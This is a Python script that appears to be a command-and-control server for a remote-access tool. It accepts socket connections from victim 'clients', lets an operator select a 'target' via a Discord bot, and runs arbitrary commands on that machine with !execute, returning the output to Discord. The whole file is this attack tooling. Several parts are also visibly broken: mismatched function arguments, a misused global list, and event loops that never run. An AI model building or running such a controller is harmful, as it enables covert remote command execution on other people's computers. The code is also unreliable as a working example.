#!/usr/bin/python3

import socket
import threading
import signal
import sys
import discord
from discord.ext import commands
import asyncio
import os
import uuid

clients = []
target_client = None
response_queue = asyncio.Queue()

bot_instance = None

async def handle_client_commands(client_socket, client_id):
    while True:
        data = client_socket.recv(1024)
        if not data:
            print(f"Connection from {client_id} closed")
            clients = [client for client in clients if client[0] != client_id]
            break
        
        command = data.decode()

        try:
            response = await execute_command_on_client(client_socket, command)
            await relay_response_to_discord(response, client_socket)
        except Exception as e:
            response = f"Error executing command: {str(e)}"
            await relay_response_to_discord(response, client_socket)

    client_socket.close()

async def relay_responses():
    while True:
        response, client_socket = await response_queue.get()
        try:
            await relay_response_to_discord(response, client_socket)
        except Exception as e:
            print(f"Error relaying response to Discord: {str(e)}")

async def execute_command_on_target(command):
    global target_client
    if target_client is not None:
        try:
            response = await execute_command_on_client(target_client[1], command)
            return response
        except Exception as e:
            response = f"Error executing command: {str(e)}"
            return response
    else:
        return "No target client selected"

def handle_client(client_socket, address):
    client_id = str(uuid.uuid4())
    print(f"Accepted connection from {address} with ID: {client_id}")
    clients.append([client_id, client_socket, None])
    client_socket.send(f"Welcome {client_id}".encode())

    loop = asyncio.new_event_loop()
    asyncio.run_coroutine_threadsafe(handle_client_commands(client_socket, client_id), loop)

async def execute_command_on_client(client_socket, command):
    client_socket.send(command.encode())
    response = client_socket.recv(4096).decode()
    return response

async def relay_response_to_discord(response):
    #print(f"Response from client: {response}")
    global bot_instance, target_client
    if bot_instance is not None and response is not None and response.strip():
        if target_client is not None and target_client[2] is not None:
            channel = bot_instance.get_channel(target_client[2])
        # Find the corresponding Discord channel using the client_socket
            if channel:
                await channel.send(response)
            else:
                print("Channel not found.")
        else:
            print("Discord Channel ID not set for the client.")
    else:
        print("Bot instance not available or response is empty")

def close_server(signal, frame):
    global clients
    print("\nClosing server and terminating all connections...")
    for client_info in clients:
        client_socket = client_info[1]
        client_socket.close()
    sys.exit(0)

def list_active_connections():
    connections = [f"{i}: {client[1].getpeername()[0]}:{client[1].getpeername()[1]}" for i, client in enumerate(clients)]
    return '\n'.join(connections)


def switch_target_client(index):
    global target_client
    if 0 <= index < len(clients):
        target_client = clients[index]
        return f"Switched target client to {index}"
    else:
        return "Invalid client index"

def main():
    host = "127.0.0.1"  # Change this to your server's IP address
    port = 8888  # You can use any available port number

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print(f"Server listening on {host}:{port}")

    def run_server():
        while True:
            client_socket, address = server_socket.accept()
            client_handler = threading.Thread(target=handle_client, args=(client_socket, address))
            client_handler.start()

    server_thread = threading.Thread(target=run_server)
    server_thread.start()

    signal.signal(signal.SIGINT, close_server)  # Register the signal handler

    # Discord bot setup
    intents = discord.Intents.all()
    TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
    GUILD = "SERVER NAME" # Replace this with the server's name

    bot = commands.Bot(command_prefix='!', intents=intents)

    global bot_instance
    bot_instance = bot


    @bot.event
    async def on_ready():
        print(f'Bot is ready. Logged in as {bot.user}')

    @bot.command(name='list')
    async def list_connections(ctx):
        await ctx.send("Active connections:\n" + list_active_connections())

    @bot.command(name='target')
    async def set_target(ctx, index: int):
        global target_client
        if 0 <= index < len(clients):
            clients[index][2] = ctx.channel.id
            target_client = clients[index]
            response = f"Switched target client to {index}"
        else:
            response = "Invalid client index"
        await ctx.send(response)

    @bot.command(name='execute')
    async def execute_command(ctx, *, command: str):
        try:
            response = await execute_command_on_target(command)
        except Exception as e:
            response = f"Error executing command: {str(e)}"
        await relay_response_to_discord(response)

    @bot.command(name='h')  # Changed help to h
    async def help_commands(ctx):
        help_text = """Available commands:
        !list - list all the active connections
        !target <number> - switch the target client to the number in the list
        !execute <command> - send the message that follows to the targeted client
        !h - list these commands"""  # Changed help to h
        await ctx.send(help_text)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    # Start the relay_responses coroutine in a separate thread
    relay_thread = threading.Thread(target=asyncio.run_coroutine_threadsafe, args=(relay_responses(), loop))
    relay_thread.start()

    bot.run(TOKEN)

if __name__ == "__main__":
    main()
